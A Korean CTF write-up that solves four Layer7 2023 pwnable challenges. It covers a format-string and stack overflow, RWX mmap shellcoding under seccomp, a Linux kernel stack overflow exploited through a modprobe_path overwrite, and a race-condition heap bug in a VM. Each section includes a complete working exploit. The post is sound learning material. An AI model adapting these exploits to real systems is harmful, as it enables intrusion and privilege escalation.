---
layout: post
title: "2023 Layer7 CTF - Pwnable Write up"
date: 2023-12-02 23:00:00 +0900
categories: [Security, CTF]
tags: [CTF, linux, BOF, FSB, kernel, Race Condition]
img_path: 20231202_Layer7-CTF_write-up
image: 1.jpg
---

HSPACE를 통해서, 선린인터넷고등학교 해킹 동아리인 Layer7에서 CTF를 개최한다는 걸 알게 됐고, 상위 7등 안에만 들자는 생각으로 참여하게 되었다.

![scoreboard](2.png)
*Scoreboard*

열심히 문제를 풀다 보니 대회 종료 당일 오전 4시까지 1등이 될 수 있었으나, 막상 잠자고 오니까 2등이 되어서 아쉬웠다.

역시 웹이나 리버싱 쪽도 지식을 많이 길러둬야 이런 개인전 CTF에서 좋은 성적을 거둘 수 있는 것 같다.

## **1. Simple is The Best**

### **[0x01] 요약**

FSB + Stack BOF 문제, 원하는 방식으로 익스하면 된다.

[Simple is The Best chal](https://github.com/brwook/binary/raw/main/2023-Layer7-CTF/simple_is_the_best.zip)

### **[0x02] 분석**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[104]; // [rsp+0h] [rbp-70h] BYREF
  unsigned __int64 v5; // [rsp+68h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  menu(argc, argv, envp);
  setvbuf(stdout, 0LL, 2, 0LL);
  printf("Chu: ");
  fgets(s, 100, stdin);
  printf(s);
  printf("Simple Is The Best!");
  read(0, s, 500uLL);
  return 0;
}
```

FSB와 Stack BOF 취약점을 동시에 주는 문제이다.

```
[*] '/home/brwook/ctf/46_2023Layer7CTF/simple-is-the-best/simple_is_the_best'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Partial RELRO가 걸러 있기 때문에, FSB를 통한 GOT Overwrite로도 풀 수 있을 것 같긴 하다. 나는 단순히 FSB는 libc와 Canary leak 용도로만 사용하고, ROP 해서 풀어냈다.

### **[0x03] 익스플로잇**

```python
from pwn import *

context(arch='amd64', os='linux')
if args.REMOTE:
    p = remote("prob.layer7.kr", 10008)
    libc = ELF("./libc-2.27.so", False)
else:
    p = process("./simple_is_the_best", aslr=1)
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", False)

payload = b'%p:' * 32
p.sendlineafter(b"Chu: ", payload)
res = p.recvline().split(b":")
canary = int(res[18], 16)
log.success(f"canary @ {hex(canary)}")

libc.address = int(res[20], 16) - libc.libc_start_main_return
log.success(f"libc base @ {hex(libc.address)}")

rop = ROP(libc)
rop.call(rop.find_gadget(["ret"]))
rop.call("system", [next(libc.search(b"/bin/sh"))])
payload = b'A'*0x68
payload += p64(canary)
payload += b'B'*8
payload += rop.chain()
p.sendafter(b"Best!", payload)
p.sendline(b'cat flag')

p.interactive()
```

`Layer7{S1rnPl3_1S_tH3_B3ST!~!}`

## **2. unmap**

### **[0x01] 요약**

mmap RWX page allocation with Stack BOF + Shellcoding

[unmap chal](https://github.com/brwook/binary/raw/main/2023-Layer7-CTF/ummap.zip)

### **[0x02] 분석**

```c
void *allocateMemory()
{
  char s[24]; // [rsp+0h] [rbp-30h] BYREF
  int v2; // [rsp+18h] [rbp-18h]
  int prot; // [rsp+1Ch] [rbp-14h]
  int flags; // [rsp+20h] [rbp-10h]
  int fd; // [rsp+24h] [rbp-Ch]
  int v6; // [rsp+28h] [rbp-8h]
  int v7; // [rsp+2Ch] [rbp-4h]

  Init();
  v7 = 0;
  v6 = 0;
  fd = -1;
  flags = 33;
  prot = 3;
  v2 = 200;
  printf("Name this memory space plz : ");
  memset(s, 0, 0x14uLL);
  gets(s);
  add = mmap(0LL, v2, prot, flags, fd, v6);
  memset(add, 0, 0xC8uLL);
  printf("Memory %s allocated at %p successfully!\n", s, add);
  return add;
}
```

`allocateMemory` 함수를 통해서, 본래 RW(3) 권한 페이지를 할당할 수 있는데, `gets` 함수로 인해 Stack BOF가 발생하여 RWX(7) 권한 페이지로 할당할 수 있다.

할당한 페이지의 주소는 함수 끝에서 출력해준다.

```
[*] '/home/brwook/ctf/46_2023Layer7CTF/ummap/deploy/ummap'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

이때, Canary는 없으나 PIE 보호 기법이 걸려 있기 때문에 바로 ROP로 이어질 수는 없었다.

`main` 함수 내에서는 할당된 영역에 대해 임의 데이터를 작성할 수 있다.

```c
void __noreturn exitProgram()
{
  char buf[72]; // [rsp+0h] [rbp-50h] BYREF
  void (*v1)(void); // [rsp+48h] [rbp-8h]

  v1 = (void (*)(void))welcome;
  puts("Do you know about mmap?");
  read(0, buf, 0x60uLL);
  v1();
  exit(1);
}
```

프로그램 종료 시, `exitProgram` 함수에서도 Stack BOF가 발생해서 RIP 컨트롤이 가능해진다. 이전에 얻어낸 쉘 코드 주소를 그대로 `v1` 변수에 덮어써서 쉘 코드를 실행할 수 있다.

```bash
$ seccomp-tools dump ./ummap
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x05 0xc000003e  if (A != ARCH_X86_64) goto 0007
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x02 0xffffffff  if (A != 0xffffffff) goto 0007
 0005: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0007
 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0007: 0x06 0x00 0x00 0x00000000  return KILL
```

이때, seccomp rule에 유의해서 쉘 코딩을 해야 하는데, 지금 보니까 굳이 ORW를 안 해도 execveat syscall로 쉘을 딸 수 있었을 것 같다.

```dockerfile
FROM ubuntu:22.04@sha256:35fb073f9e56eb84041b0745cb714eff0f7b225ea9e024f703cab56aaa5c7720
RUN apt-get update && apt-get install -y socat
RUN adduser ummap
COPY ./deploy/* /home/ummap/
WORKDIR /home/ummap
RUN chmod 644 /home/ummap/flag
RUN chmod 755 /home/ummap/ummap
USER ummap
EXPOSE 9003
CMD socat TCP-LISTEN:9003,reuseaddr,fork EXEC:./ummap,stderr
```

플래그 주소를 `Dockerfile`에서 확인할 수 있으므로, ORW 쉘 코드를 삽입해서 플래그를 얻어내면 된다.


### **[0x03] 익스플로잇**

```python
from pwn import *
if args.REMOTE:
    p = remote("prob.layer7.kr", 13001)
else:
    p = process("./ummap", aslr=0)

context(arch='amd64', os='linux')
pay=pwnlib.shellcraft.open('/home/ummap/flag')
pay+=pwnlib.shellcraft.read('rax', 'rsp', 0x100)
pay+=pwnlib.shellcraft.write(1, 'rsp', 0x100)

# 1. alloc with RWX (prot - 7)
payload = b'A'*0x18
payload += p32(0x1000)
payload += p32(7)[:3]
p.sendlineafter(b"> ", b'1')
p.sendlineafter(b": ", payload)
p.recvuntil(b"at ")
addr = int(p.recvuntil(b" "),16)
log.success(f"mmapped addr @ {hex(addr)}")

# 2. write shellcode
p.sendlineafter(b"> ", b'2')
p.send(asm(pay))

# 3. execute shellcode
p.sendlineafter(b"> ", b'4')
p.sendafter(b"\n", b'A'*0x48 + p64(addr))

p.interactive()
```

`Layer7{d0_Y0U_kn0w_480U7_mM4P?}`

## **3. KOF**

### **[0x01] 요약**

- `kof_write` 함수에서 Kernel Stack BOF가 발생함
- kaslr과 smep, 그리고 canary 보호 기법을 우회해야 하는데, `kof_read` 함수에서 임의 주소 읽기가 가능해서 이걸로 브루트포싱해서 얻음
- 최종 익스 기법은 modprobe_path overwrite을 사용함

[KOF chal](https://github.com/brwook/binary/raw/main/2023-Layer7-CTF/KOF.zip)

### **[0x02] 분석**

```bash
qemu-system-x86_64 -cpu kvm64,+smep \
  -m 64M \
  -kernel ./bzImage \
  -initrd ./kof.cpio \
  -nographic \
  -monitor /dev/null \
  -no-reboot \
  -append "kaslr root=/dev/ram rw rdinit=/root/init console=ttyS0 loglevel=3 oops=panic panic=1"
```

제공되는 qemu 명령어 실행 파일을 보면, 보호기법을 확인할 수 있다. 보호 기법은 아래와 같다.

- KASLR (Kernel Address Space Layout Randomization)
- SMEP (Supervisor Mode Execution Prevention)

따라서, 단순히 커널 스택의 RET에 userland 주소를 넣어서 권한 상승을 하는 것은 불가능하고, 커널 주소를 활용한 ROP payload를 구성해야 한다.

또한, 커널 주소를 얻어내야 하며, 커널 모듈 자체에 Canary 보호 기법도 걸려 있기 때문에 Canary 값도 얻어내야 한다.

KOF 디바이스에서는 `kof_write`, `kof_read` 함수 두 개를 지원한다.

```c
__int64 __fastcall kof_write(__int64 a1, char *from, unsigned __int64 n)
{
  __int64 result; // rax
  unsigned __int64 v4; // rdx
  __int64 to[32]; // [rsp+0h] [rbp-108h] BYREF
  unsigned __int64 canary; // [rsp+100h] [rbp-8h]

  canary = __readgsqword(0x28u);
  memset(to, 0, sizeof(to));
  if ( n > 0x7FFFFFFF )
    BUG();
  result = (int)copy_from_user((char *)to, from, n);// kernel BOF
  v4 = canary - __readgsqword(0x28u);
  if ( v4 )
    return _pfx_kof_read((__int64)to, from, v4);
  return result;
}
```

`kof_write` 함수에서는 BOF 취약점이 발생한다. 즉, ROP가 가능하다. 물론, 아직 canary 값과 커널 베이스를 모르는 것이 문제이다.

```c
__int64 __fastcall kof_read(__int64 a1, char *a2, unsigned __int64 a3)
{
  if ( a3 > 0x7FFFFFFF )
    BUG();
  return (int)copy_to_user(a2 + 8, *(char **)a2, a3);
}
```

`kof_read` 함수에서는 AAR primitive를 제공한다. 임의 커널 주소에 대해 메모리 값을 가져올 수 있는데, 중요한 것은 우리가 어떤 커널 주소도 알고 있지 않은 상태라는 것이다.

그래서 브루트포싱으로 커널 베이스 주소를 알아내야 하는데, 이때, `copy_to_user` 함수의 `rsi` 값 (커널 주소)가 유효하지 않아도 크래시가 발생하지 않아 브루트포싱이 가능하다.

![4.png](4.png)
*vmlinux base*

`vmlinux` 바이너리가 매핑되어 있는 주소 쪽이 엔트로피가 상대적으로 훨씬 적어서, 그쪽으로 브루트포싱하는 것이 좋다는 걸 경험적으로 확인했다. 해당 값을 nokaslr 상태에서의 값을 시작으로 0x1000씩 더해가면서 커널 베이스를 구할 수 있었다.

![5.png](5.png)
*maybe kernel stack?*

또한, 커널 내에 다른 유효한 페이지의 시작 주소가 박혀 있는 경우가 곧잘 존재하더라. 아마도 커널 스택이라고 생각은 하는데, 어쨌든, 그걸 활용해서 Canary 값을 leak해 올 수 있었다. 가져온 메모리에 있는 값 중 0번째 바이트가 0이고 다른 값이 모두 겹치지 않는 8바이트 값을 가져와서 그런지 Canary 값이 다른 경우가 있긴 했다. 정확하게 알 수 있는 방법이 궁금하긴 하다.

그렇게 커널 베이스와 Canary 값을 구했으면 이제 ROP를 권한상승을 하고, `/root/flag`를 읽어내야 한다.

그런데, 유효한 가젯을 찾기가 힘들더라. 여러 삽질을 하다가 `modprobe_path`를 덮어서 익스하는 기법이 가장 간단하게 생겨서 그걸 가져왔다.

### **[0x03] 익스플로잇**

```c
// gcc -masm=intel -static -o exp exp.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>

unsigned long __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);

struct register_val {
    uint64_t user_rip;
    uint64_t user_cs;
    uint64_t user_rflags;
    uint64_t user_rsp;
    uint64_t user_ss;
} __attribute__((packed));
struct register_val rv;

void shell() {
    execl("/bin/sh", "sh", NULL);
}

void backup_rv(void) {
    asm("mov rv+8, cs;"
        "pushf; pop rv+16;"
        "mov rv+24, rsp;"
        "mov rv+32, ss;"
       );
    rv.user_rip = &shell;
}

void get_flag(void){
    puts("[*] Returned to userland, setting up for fake modprobe");

    system("echo '#!/bin/sh\ncp /root/flag /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");

    exit(0);
}

int main() {
    int fd = open("/dev/kof", O_RDWR);
    size_t buf[0x1000] = {0,};
    int i;

    printf("%d\n", fd);
    for (int i=0;; ++i) {
        buf[0] = 0xffffffff81000000 + i * 0x1000;
        // printf("%llx\n", buf[0]);
        read(fd, buf, 0x100);
        if (buf[1])
            break;
    }

    void *kernel_base = buf[0];
    commit_creds = kernel_base + 0xb6340;
    prepare_kernel_cred = kernel_base + 0xb65f0;
    size_t pop_rdi = kernel_base + 0x1be6a5;
    size_t pop_rcx = kernel_base + 0x24e43;
    size_t pop_rax = kernel_base + 0xb9279;
    // 0xffffffff814bfa34: mov byte [rbx], ah ; ret ; (1 found)
    size_t write_byte_rbx_ah = kernel_base + 0x4bfa34;
    size_t pop_rbx = kernel_base + 0x65167;

    size_t swapgs_restre_regs_and_return_to_usermode = kernel_base + 0x1001610;
    size_t kpti_trampoline = swapgs_restre_regs_and_return_to_usermode + 0x31;
    size_t modprobe_path = kernel_base + 0x1b3fb80;
    printf("[+] kernel base @ %p\n", kernel_base);
    
    size_t target = kernel_base + 0x17761f0;
    buf[0] = target;
    read(fd, buf, 0x100);
    size_t data_head = buf[1];
    printf("[*] data head @ %p\n", data_head);

    size_t canary = 0;
    for (int k=0;; ++k) {
        unsigned char val[8] = {0, };
        memset(buf, 0, 0x1000);
        buf[0] = data_head + 0x1000 * k;
        printf("%p\n", buf[0]);
        read(fd, buf, 0x1000);
        for (int i=1; i<0x1000/8; ++i) {
            int flag = 1;
            if ((buf[i] & 0xFF) != 0)
                flag = 0;

            if (flag) {
                for (int j=1; j<8; ++j) {
                    val[j] = (buf[i] >> j*8)&0xFF;
                    for (int l=0; l<j; ++l) 
                        if (val[j] == val[l])
                            flag = 0;
                }
            }

            if (flag) {
                canary = buf[i];
                printf("canary @ %p\n", canary);
                goto EXPLOIT;
            }
        }
    }
    
EXPLOIT:
    backup_rv();
    memset(buf, 0, 0x280);
    size_t val = 0x782f706d742f; // "/tmp/x"
    unsigned off = 0x20;
    buf[off++] = canary;
    for (int i=0; i<7; ++i) {
        buf[off++] = pop_rbx;
        buf[off++] = modprobe_path + i;
        buf[off++] = pop_rax;
        buf[off++] = (val & 0xFF) << 8;
        buf[off++] = write_byte_rbx_ah;
        val >>= 8;
    }
    buf[off++] = kpti_trampoline;
    buf[off++] = 0;
    buf[off++] = 0;
    buf[off++] = (unsigned long)get_flag;
    buf[off++] = rv.user_cs;
    buf[off++] = rv.user_rflags;
    buf[off++] = rv.user_rsp;
    buf[off++] = rv.user_ss;

    write(fd, &buf, 0x280);
    return 0;
}
```

![3.png](3.png)
*get flag on remote*

`Layer7{d9a9e8b070456e31f591251d45547a9e70e8317ca3e9288d7488e0b37dc8d336}`

이 문제로 오랜만에 커널에 물꼬를 텄다. 다른 커널 문제도 풀어보면서 더 정확한 지식으로 빠르게 풀 수 있도록 해야겠다.

### **[0x04] 참고 자료**
- **modprobe_path overwrite**
  - [https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/](https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/)
  - [https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/](https://0x434b.dev/dabbling-with-linux-kernel-exploitation-ctf-challenges-to-learn-the-ropes/)
  - [https://blog.naver.com/PostView.naver?blogId=yjw_sz&logNo=222244452638](https://blog.naver.com/PostView.naver?blogId=yjw_sz&logNo=222244452638)
- **ptr-yudai님의 write-up**
  - Kernel base leak
    ![6.png](6.png)
    *IDT*

    - 커널 내에 존재하는 IDT (Interrupt Descriptor Table) 주소를 통해서 kernel base를 leak했다. 찾아보니, 해당 주소는 `CPU_ENTRY_AREA_RO_IDT(0xfffffe0000000000)`와 동일한 값으로 KASLR의 영향을 받지 않으면서 고정된 주소에 매핑된다는 것을 알았다. IDT는 CPU가 실행 도중 인터럽트가 발생했을 때, 해당 이벤트를 처리해주는 핸들러를 저장하는 테이블로 알고 있는데, 자세한 내용은 추후 조사해 보는 게 좋을 것 같다.
  - Canary leak 
    - 도대체 current 변수가 뭔가 싶었는데, 검색 좀 해보니 `prctl` 함수로 현재 task의 이름을 지정하고, `init_task`부터 시작해서 연결리스트를 순회해서 현재 task를 찾고 이를 기반으로 Canary를 찾는 시나리오가 좀 대중적으로 알려진 방법인 것 같다. 나는 canary 검색해가면서 유효한 page를 때려맞춰서 찾았으나, 훨씬 더 정확하고 효율적인 방법인 것 같다.
      - [https://ditt0.medium.com/imaginary-ctf-2023-ee09bf09a016](https://ditt0.medium.com/imaginary-ctf-2023-ee09bf09a016)


## **4. ezvm**

### **[0x01] 요약**

- Race condition으로 인해 free된 청크가 그대로 연결리스트에 삽입되어 TLS heap 주소가 leak 되고, tcache dup 공격이 가능해짐
- tcache dup으로 TLS 영역에 존재하는 `tcache_perthread_struct` 청크 근처 주소로 할당해서 libc leak도 수행하고, AAR/AAW primitive를 획득함
- 이후에는 스택에서 ROP해서 익스플로잇 수행함

[ezvm chal](https://github.com/brwook/binary/raw/main/2023-Layer7-CTF/ezvm.zip)

### **[0x02] 분석**

```
[*] '/home/brwook/ctf/46_2023Layer7CTF/ezvm/a.out'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

모든 보호기법이 짱짱하게 걸린 VM 문제이다.

```c
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 Context         struc ; (sizeof=0x78, mappedto_8)
00000000 reg0            dd ?
00000004 reg1            dd ?
00000008 reg2            dd ?
0000000C reg3            dd ?
00000010 reg4            dd ?
00000014 stack_pointer   dd ?
00000018 pc              dd ?
0000001C field_1C        dd ?
00000020 mem             dq ?                    ; offset
00000028 func0           dq ?
00000030 func1           dq ?
00000038 func2           dq ?
00000040 func3           dq ?
00000048 func4           dq ?
00000050 HEAD            dq 5 dup(?)             ; offset
00000078 Context         ends
00000078
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 Addr            struc ; (sizeof=0x10, mappedto_9)
00000000 code            dq ?
00000008 data            dq ?
00000010 Addr            ends
00000010
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 element         struc ; (sizeof=0x20, mappedto_11)
00000000 alive_flag      dd ?
00000004 field_4         dd ?
00000008 size            dq ?
00000010 ptr             dq ?
00000018 next            dq ?
00000020 element         ends
```

`Context`는 말그대로 CPU Context라고 생각하면 된다.
- reg0-5 : 5개의 범용 레지스터
- stack_pointer : 스택 포인터
- pc : PC 레지스터
- mem : 코드 영역(우리의 입력이 저장됨)과 스택 영역의 주소를 담고 있는 힙 포인터
- func0-4 : syscall을 구현해 놓은 것 같은 함수 포인터
  - func0 : allocation
  - func1 : free
  - func2 : read
  - func3 : write
  - func4 : stack read/write (maybe related with uninitialized stack)
- HEAD : 동적 할당되는 청크를 관리하는 청크(`element`)가 연결리스트로 저장되는데, 그것의 시작을 담고 있는 5개의 포인터

`element`는 할당된 힙 청크에 대한 메타 정보를 저장하고 있는 청크이다.
- alive_flag : 할당 시 0으로 초기화하고, 연결리스트에 연결 후에 1로 세팅된다. 만약, 값이 0이라면 Garbage Collection (GC) 쓰레드에서 free해버리고 값을 0xDEADBEEF로 바꿔버린다.
- size : 할당한 청크의 size를 저장한다. func2, func3에서 이 값을 사용해서 변조되면 큰일난다.
- ptr : 할당한 청크의 포인터
- next : 연결리스트 내에 다음으로 연결된 `element` 청크 포인터

VM에서 제공하는 명령어는 총 5개 정도로 레지스터 GET/SET, 스택 GET/SET, syscall(0xFF) 정도인 것 같다. 스택 관련해서 더 명령어가 조금 있긴 한데, 익스에 사용하지는 않았다.

인텐 풀이는 **uninitialized heap으로 발생하는 UAF** 정도로 설명된 것 같긴 한데, 나는 취약점이 1개 더 있다고 조심스럽게 이야기해본다.

바로 **Race Condition으로 인한 UAF**이다.

```c
  if ( size <= 0x1FF )
  {
    ptr = (void *)wait_allocation(size & 0x1FF);
    if ( ptr )
    {
      read(0, ptr, size & 0x1FF);               // malloc any size (< 0x200)
                                                // uninitialized heap
      ele = (element *)wait_allocation(0x20uLL);
      ele->ptr = (__int64)ptr;
      ele->alive_flag = 0;
      switch ( index )
      {
        case 0:
          if ( context->HEAD[0] )               // append Element
          {
            for ( i = context->HEAD[0]; i->next; i = (element *)i->next )
              ;
            ++ele->alive_flag;
            ele->size = size;
            i->next = (__int64)ele;
          }
          else
          {
            ele->size = size;
            ++ele->alive_flag;
            context->HEAD[0] = ele;
            qword_5040[0] = ele;
          }
          break;
```

이전에 언급했듯이 청크를 할당할 때, `alive_flag`를 0으로 우선 만들고, 연결리스트에 연결한 다음에 `++ele->alive_flag` 연산을 한다. 즉, 0으로 초기화되고 1이 되기까지의 텀이 꽤 존재한다. `element` 연결리스트 연결을 위해서 메모리 탐색을 계속 하기 때문이다.

```c
void __fastcall __noreturn start_routine(void *a1)
{
  while ( 1 )
  {
    if ( allocation_flag )
    {
      v3 = malloc(size);
      allocation_flag = 0;
      g_ptr = (__int64)v3;
    }
    LODWORD(ptr) = 0;
    while ( (int)ptr <= 4 )
    {
      for ( ptr_4 = qword_5040[(int)ptr]; ptr_4; ptr_4 = next )
      {
        next = (element *)ptr_4->next;
        if ( !ptr_4->alive_flag )
        {
          free((void *)ptr_4->ptr);
          free(ptr_4);
          ptr_4->alive_flag = 0xDEADBEEF;
        }
      }
      ptr = (unsigned int)(ptr + 1);
    }
  }
}
```

청크를 할당하고 해제하는 역할을 맡는 쓰레드 함수인 `start_routine`는 `alive_flag`가 0일 때 해당 청크를 free하기 때문에, 그 텀 사이에 해당 청크의 `alive_flag`가 검사될 경우, 새롭게 할당한 청크임에도 바로 free가 되고, 연결리스트엔 free된 `element`가 존재하게 된다.

![7.png](7.png)
*free된 청크가 Context내 연결리스트 헤드로 존재하는 모습*

위 사진처럼, free된 `element`가 연결리스트에 들어가게 되면, 이후에는 간단하다. 연결리스트에 내에 free된 청크가 존재하기 때문에, 그대로 값을 출력해 볼 수 있고, 이를 통해 TLS 값을 leak할 수 있다.

또한, `element`의 크기(0x20) 만큼 할당해서 `element`의 값들을 내가 원하는 값으로 세팅해서 사용할 수 있다. 이후에는, 해당 값을 수정함으로써 libc까지 leak을 하고, TLS 내에 존재하는 `tcache_perthread_struct`를 덮어서 원하는 주소에 원하는 값을 읽고 쓸 수 있으니, AAR/AAW primitive를 획득했다고 이야기할 수 있다.

만약 할당 시에 바로 0으로 초기화한 뒤 1로 바꾸는 것이 아니라, 바로 1로 초기화해버렸다면 위 취약점은 없었을 것 같다.

### **[0x03] 익스플로잇**

```python
from pwn import *

def setRegister(idx, value):
    return b'\xCD' + p8(idx) + p32(value)

def push(value):
    return b'\x08' + p32(value)

def syscall(rax):
    return setRegister(0, rax) + b'\xFF'

def malloc(idx, size):
    return push(idx) + push(size) + syscall(0)

def free(idx, cnt):
    return push(idx) + push(cnt) + syscall(1)

def write(idx, cnt):
    return push(idx) + push(cnt) + syscall(3)

def read(idx, cnt):
    return push(idx) + push(cnt) + syscall(2)

if args.REMOTE:
    p = remote("prob.layer7.kr", 13000)
    libc = ELF("./libc.so.6", False)
else:
    p = process('./a.out', aslr=1)
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", False)

context(arch='amd64', os='linux')
payload = b''
payload += malloc(0, 0x100)
payload += free(0, 0)
payload += malloc(0, 0x100)
payload += write(0, 0)          # trigger uninitialized heap
payload += malloc(0, 0x20)      # overwrite management object
payload += write(0, 0)
payload += read(0, 0)
payload += malloc(1, 0x30)
payload += write(1, 0)
payload += read(0, 0)
payload += malloc(1, 0x30)
p.send(payload)
for _ in range(2):
    sleep(0.1)
    p.send(b'\x00')

# 1. TLS base leak
tls =  (u64(p.recv(8)) << 12) 
heap = tls + 0x8d0
log.success(f"heap @ {hex(heap)}")
p.recv()

# 2. libc leak by overwriting management object
p.send(p64(1) + p64(0x1010) + p64(tls + 0x8a0) + p64(0))
what = u64(p.recv(8))
libc.address = what - 0x100 - 0xE0 - libc.symbols['_IO_2_1_stdin_']
log.success(f"libc @ {hex(libc.address)}")

# 2. stack leak by overwriting tcache_perthread_entry
base = p64(what) + p64(0) + p64(1) + p64(0x21000) + p64(0x21000) + p64(0) * 2 + p64(0x295)
payload = base
payload += p64(1 << 32) + p64(0) * 17 + p64(libc.symbols['environ'] - 0x10)
p.send(payload)

p.send(b'A'*0x10)
p.recvuntil(b"A"*0x10)
stack = u64(p.recv(8))
log.success(f"stack @ {hex(stack)}")

# 3. ROP in main RET
base = p64(what) + p64(0) + p64(1) + p64(0x21000) + p64(0x21000) + p64(0) * 2 + p64(0x295)
payload = base
payload += p64(1 << 32) + p64(0) * 17 + p64(stack - 0x128)
p.send(payload)

rop = ROP(libc)
rop.call(rop.find_gadget(["ret"]))
rop.call("system", [next(libc.search(b'/bin/sh'))])
p.send(b'A'*8 + rop.chain())
p.interactive()
```

`Layer7{https://velog.io/@oceanwater1234/나는-자고-싶다}`